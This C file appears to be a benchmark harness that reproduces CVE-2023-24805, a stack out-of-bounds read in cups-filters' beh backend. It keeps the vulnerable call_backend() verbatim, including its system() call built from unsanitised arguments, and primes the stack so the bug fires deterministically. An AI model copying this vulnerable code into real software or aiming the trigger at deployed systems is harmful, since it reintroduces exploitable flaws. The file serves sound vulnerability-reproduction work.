/* cve_barebone harness -- CVE-2023-24805 / cups-filters backend/beh.c call_backend()
 *
 * The fix commit (8f274035756c04efeb77eb654e9d4c4447287d65) replaces:
 *     strncpy(scheme, uri, sizeof(scheme) - 1);
 *     if (strlen(uri) > 1023) scheme[1023] = '\0';
 *     if ((ptr = strchr(scheme, ':')) != NULL) *ptr = '\0';
 * with scheme[0]='\0'; strncat(...). The old code null-terminates `scheme` (char[1024]) only
 * when strlen(uri) < 1023 (strncpy's own zero-pad) or strlen(uri) > 1023 (explicit
 * scheme[1023]='\0'); at strlen(uri) == 1023 EXACTLY neither fires, so scheme[1023] keeps
 * whatever was already on the stack. If that byte isn't '\0' and uri has no ':', the very next
 * line's strchr(scheme, ':') scans past the 1024-byte array -> stack-buffer-overflow READ
 * (CWE-125), squarely inside call_backend's own body, before anything else in the function runs.
 *
 * call_backend() below is pasted BYTE FOR BYTE from target/original_function.c.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <errno.h>

/* ---- real, stable public-API constants call_backend needs ---- */
/* <cups/backend.h> enum cups_backend_e (external libcups dependency, not vendored here) */
typedef enum cups_backend_e
{
  CUPS_BACKEND_OK             = 0,
  CUPS_BACKEND_FAILED         = 1,
  CUPS_BACKEND_AUTH_REQUIRED  = 2,
  CUPS_BACKEND_HOLD           = 3,
  CUPS_BACKEND_STOP           = 4,
  CUPS_BACKEND_CANCEL         = 5,
  CUPS_BACKEND_RETRY          = 6,
  CUPS_BACKEND_RETRY_CURRENT  = 7
} cups_backend_t;

/* autoconf-generated config.h path constant (compile-time default server bin dir); the
 * exact value is never on any crash/safe-exit path exercised below, only ever assigned into
 * a local that's either unused (safe exit before it matters) or would feed a system() call
 * we never reach. */
#define CUPS_SERVERBIN "/usr/lib/cups"

/* Force ASAN off its fake-stack (use-after-return) allocator so call_backend's own huge
 * (cmdline[65536]-dominated) frame reuses the REAL machine stack bytes prime_stack() just
 * wrote -- makes the leftover-byte-at-scheme[1023] condition deterministic instead of
 * accidental. ASAN_OPTIONS from the runner only overrides keys it sets; this key isn't one
 * of them, so this default applies. */
const char *__asan_default_options(void)
{
  return "detect_stack_use_after_return=0";
}

/* Runs immediately before the call_backend() invocation that targets the bug: fills a stack
 * region well larger than call_backend's own frame with a byte that is neither NUL nor ':',
 * so when call_backend's frame reuses this same memory, scheme[1023] (left untouched by the
 * buggy strncpy/guard pair at uri-length-1023) is guaranteed non-terminating. */
__attribute__((noinline))
static void prime_stack(void)
{
  volatile unsigned char junk[131072];
  size_t i;
  for (i = 0; i < sizeof(junk); i++)
    junk[i] = 0x41; /* 'A' */
}

static int
call_backend(char *uri,                 // I - URI of final destination
	     int  argc,                 // I - Number of command line
	                                //     arguments
	     char **argv,		// I - Command-line arguments
	     char *filename)            // I - File name of input data
{
  const char	*cups_serverbin;	// Location of programs
  char		scheme[1024],           // Scheme from URI
                *ptr,			// Pointer into scheme
		cmdline[65536];		// Backend command line
  int           retval;

  //
  // Build the backend command line...
  //

  strncpy(scheme, uri, sizeof(scheme) - 1);
  if (strlen(uri) > 1023)
    scheme[1023] = '\0';
  if ((ptr = strchr(scheme, ':')) != NULL)
    *ptr = '\0';

  if ((cups_serverbin = getenv("CUPS_SERVERBIN")) == NULL)
    cups_serverbin = CUPS_SERVERBIN;

  if (!strncasecmp(uri, "file:", 5) || uri[0] == '/')
  {
    fprintf(stderr,
	    "ERROR: beh: Direct output into a file not supported.\n");
    exit (CUPS_BACKEND_FAILED);
  }
  else
    snprintf(cmdline, sizeof(cmdline),
	     "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
	     cups_serverbin, scheme, argv[1], argv[2], argv[3],
	     // Apply number of copies only if beh was called with a
	     // file name and not with the print data in stdin, as
	     // backends should handle copies only if they are called
	     // with a file name
	     (argc == 6 ? "1" : argv[4]),
	     argv[5], filename);

  //
  // Overwrite the device URI and run the actual backend...
  //

  setenv("DEVICE_URI", uri, 1);

  fprintf(stderr,
	  "DEBUG: beh: Executing backend command line \"%s\"...\n",
	  cmdline);
  fprintf(stderr,
	  "DEBUG: beh: Using device URI: %s\n",
	  uri);

  retval = system(cmdline) >> 8;

  if (retval == -1)
    fprintf(stderr, "ERROR: Unable to execute backend command line: %s\n",
	    strerror(errno));

  return (retval);
}

/* ================= driver ================= */
int main(int argc, char **argv)
{
  if (argc < 2) { fprintf(stderr, "usage: %s <input>\n", argv[0]); return 2; }

  FILE *fp = fopen(argv[1], "rb");
  if (!fp) { perror("fopen"); return 2; }
  fseek(fp, 0, SEEK_END);
  long ln = ftell(fp);
  fseek(fp, 0, SEEK_SET);
  if (ln < 0) ln = 0;
  size_t n = (size_t)ln;
  unsigned char *data = (unsigned char *)malloc(n ? n : 1);   /* HEAP input */
  size_t got = fread(data, 1, n, fp);
  fclose(fp);

  int trigger_mode = (got > 0 && data[0] == 'T');

  /* Fixed, valid call_backend() argv/filename -- irrelevant to both paths below (the
   * triggering path crashes inside strchr() before argv/filename are ever touched; the
   * safe path exit()s on the "file:" guard before the snprintf that would use them). Kept
   * non-NULL and correctly sized so the harness only ever exercises the ONE bug under test. */
  static char a0[] = "beh", a1[] = "1", a2[] = "user", a3[] = "title", a4[] = "1", a5[] = "options";
  char *cb_argv[6] = { a0, a1, a2, a3, a4, a5 };
  static char filename_buf[] = "/tmp/beh-input";

  char *uri;
  int do_prime = 0;
  if (trigger_mode)
  {
    /* EXACTLY 1023 bytes, alphabetic-only (never ':'), derived from the input payload. */
    size_t payload = got > 1 ? got - 1 : 0;
    uri = (char *)malloc(1024);
    size_t i;
    for (i = 0; i < 1023; i++)
    {
      unsigned char c = payload ? data[1 + (i % payload)] : (unsigned char)i;
      uri[i] = (char)('a' + (c % 26));       /* 'a'..'z', never NUL, never ':' */
    }
    uri[1023] = '\0';
    do_prime = 1;
  }
  else
  {
    /* "file:" + short alphabetic suffix -- has an early ':', short (< 1023), so the buggy
     * strncpy/strchr pair stays entirely in-bounds; call_backend then hits its own real
     * "file:" guard and exit()s (CUPS_BACKEND_FAILED) -- clean process exit, no system(). */
    size_t payload = got > 1 ? got - 1 : 0;
    char suffix[48];
    size_t m = payload < sizeof(suffix) - 1 ? payload : sizeof(suffix) - 1;
    size_t i;
    for (i = 0; i < m; i++)
      suffix[i] = (char)('a' + (data[1 + i] % 26));
    suffix[m] = '\0';
    uri = (char *)malloc(64);
    snprintf(uri, 64, "file:%s", suffix);
  }

  /* Free BEFORE priming: free()/ASAN's allocator bookkeeping itself uses stack, so it must
   * not run between prime_stack() and the call it primes for. */
  free(data);

  /* prime_stack() must be the ABSOLUTE LAST call before call_backend() -- nothing (not even
   * free()) may run in between, or it can clobber the stack bytes we just primed. */
  if (do_prime)
    prime_stack();

  int rc = call_backend(uri, 6, cb_argv, filename_buf);
  free(uri);
  return rc;
}
